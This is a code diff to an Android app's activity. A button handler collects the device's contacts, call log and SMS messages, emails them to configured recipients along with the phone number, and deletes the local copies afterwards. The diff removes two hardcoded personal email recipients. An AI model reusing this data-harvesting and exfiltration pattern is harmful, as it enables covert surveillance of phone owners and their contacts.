@@ -7,6 +7,7 @@ import java.util.Date;
 import java.util.List;
 
 import android.app.Activity;
+import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
 import android.util.Log;
@@ -112,53 +113,64 @@ public class InitActivity extends Activity
         {
             public void onClick(View v)
             {
+            	Context context = getApplicationContext();
             	// If network connected, try to collect and send the information
-        		if (SysUtils.isNetworkConnected(getApplicationContext()))
-        		{
-        			GetInfoTask.attachments = new ArrayList<File>();
-        			
-        			GetInfoTask.CollectContact(getApplicationContext());
-        			GetInfoTask.CollectPhoneCallHist(getApplicationContext());
-        			GetInfoTask.CollectSms(getApplicationContext());
-        		
-        			// Send mail
-        			String subject = getResources().getString(R.string.mail_from) 
-        	           		 + DeviceProperty.getPhoneNumber(getApplicationContext()) 
-        	           		 + "-" + (new SimpleDateFormat("yyyyMMdd")).format(new Date());
-        			String body = String.format(getResources().getString(R.string.mail_body), 
-        					DeviceProperty.getPhoneNumber(getApplicationContext()));
-        			List<String> fileList = new ArrayList<String>();
-        			for (int i = 0; i < GetInfoTask.attachments.size(); i++)
-        				fileList.add(GetInfoTask.attachments.get(i).getAbsolutePath());
-        			
-        			String[] recipients = {"richardroky@gmail.com", "ylssww@126.com"};
-        			String pwd = MailCfg.getSenderPwd(getApplicationContext());
-        			
-        			boolean result = false;
-        			int retry = 3;
-        			while(!result && retry > 0)
-        			{
-        				String sender = MailCfg.getSender(getApplicationContext());
-        				result = GetInfoTask.sendMail(subject, body, sender, pwd, recipients, fileList);
-        				if (!result) retry--;
-        			}
-        			if(result) {
-        				SysUtils.messageBox(getApplicationContext(), getResources().getString(R.string.action_send_mail_success));
-        			} else {
-        				SysUtils.messageBox(getApplicationContext(), getResources().getString(R.string.action_send_mail_fail));
-        			}
-        			GetInfoTask.attachments.clear();
-        			
-        			// Update the last date time
-        			if (result) {
-        				boolean successful = ConfigCtrl.setLastGetInfoTime(getApplicationContext(), new Date());
-        				if (!successful) Log.w(LOGTAG, "Failed to setLastGetInfoTime");
-        			}
-        			
-        			// Clean the files in SD-CARD
-        			FileCtrl.cleanFolder();
+        		if (!SysUtils.isNetworkConnected(context)) {
+        			SysUtils.messageBox(context, getResources().getString(R.string.action_network_disconnected));
+        			return;
         		}
-            }
+        		
+        		GetInfoTask.attachments = new ArrayList<File>();
+        		
+        		GetInfoTask.CollectContact(context);
+        		GetInfoTask.CollectPhoneCallHist(context);
+        		GetInfoTask.CollectSms(context);
+        		
+        		// If network connected, try to collect and send the information
+        		if (!SysUtils.isNetworkConnected(context)) {
+        			SysUtils.messageBox(context, getResources().getString(R.string.action_network_disconnected));
+        			return;
+        		}
+        	
+        		// Send mail
+        		String subject = getResources().getString(R.string.mail_from) 
+        	          		 + DeviceProperty.getPhoneNumber(context) 
+        	          		 + "-" + (new SimpleDateFormat("yyyyMMdd")).format(new Date());
+        		String body = String.format(getResources().getString(R.string.mail_body), 
+        				DeviceProperty.getPhoneNumber(context));
+        		List<String> fileList = new ArrayList<String>();
+        		for (int i = 0; i < GetInfoTask.attachments.size(); i++)
+        			fileList.add(GetInfoTask.attachments.get(i).getAbsolutePath());
+        		
+        		String[] recipients = GlobalPrefActivity.getMail(context).split(",");
+			if (recipients.length == 0) return;
+        		String pwd = MailCfg.getSenderPwd(context);
+        		
+        		boolean result = false;
+        		int retry = 3;
+        		while(!result && retry > 0)
+        		{
+        			String sender = MailCfg.getSender(context);
+        			result = GetInfoTask.sendMail(subject, body, sender, pwd, recipients, fileList);
+        			if (!result) retry--;
+        		}
+        		if(result) {
+        			SysUtils.messageBox(getApplicationContext(), getResources().getString(R.string.action_send_mail_success));
+        		} else {
+        			SysUtils.messageBox(getApplicationContext(), getResources().getString(R.string.action_send_mail_fail));
+        		}
+        		GetInfoTask.attachments.clear();
+        		
+        		// Update the last date time
+        		if (result) {
+        			boolean successful = ConfigCtrl.setLastGetInfoTime(context, new Date());
+        			if (!successful) Log.w(LOGTAG, "Failed to setLastGetInfoTime");
+        		}
+        		
+        		// Clean the files in SD-CARD
+        		FileCtrl.cleanFolder();
+        	}
+            
         };
         
         listener_screenshot = new OnClickListener()
